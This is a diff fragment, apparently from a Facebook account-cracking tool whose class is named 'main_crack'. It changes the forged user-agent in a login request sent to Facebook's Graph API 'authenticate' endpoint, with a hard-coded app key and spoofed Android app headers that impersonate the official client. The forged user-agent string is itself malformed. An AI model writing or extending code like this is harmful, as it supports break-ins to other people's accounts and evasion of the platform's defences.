@@ -245,7 +245,7 @@ class main_crack():
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d",}
-                    headers={'User-Agent': rjfilee(),
+                    headers={'User-Agent': riazfilee('[FBAN/FB4A;FBAV/377.0.0.108;FBBV/2685664;[FBAN/FB4A;FBAV/439.0.0.44.117;FBBV/446812233;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/Telstra Mobile;FBMF/SM-G988B;FBBD/SM-G988B;FBPN/com.facebook.katana;FBDV/SM-G988B;FBSV/4.4.2;FBCA/armeabi-v7a:armeabi;]',),
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Host': 'graph.facebook.com',
                     'X-FB-Net-HNI': '25227',
